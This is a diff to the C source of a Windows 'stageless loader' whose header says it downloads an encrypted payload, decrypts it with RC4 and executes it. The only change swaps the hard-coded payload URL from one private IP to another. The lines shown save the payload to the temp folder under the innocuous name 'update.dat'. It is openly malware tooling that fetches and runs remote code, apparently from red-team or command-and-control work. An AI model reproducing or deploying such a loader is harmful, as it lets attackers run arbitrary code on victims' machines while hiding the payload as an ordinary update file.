@@ -1,6 +1,6 @@
 /*
  * Stageless Loader - Simple RC4 Encryption
- * Downloads encrypted payload from: http://192.168.1.56:8080/payload.enc
+ * Downloads encrypted payload from: http://10.10.10.100:8080/payload.enc
  * Decrypts with RC4 and executes
  */
 
@@ -39,7 +39,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     Sleep(1000);
 
     // Download encrypted payload
-    char url[] = "http://192.168.1.56:8080/payload.enc";
+    char url[] = "http://10.10.10.100:8080/payload.enc";
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
     strcat(tempPath, "update.dat");
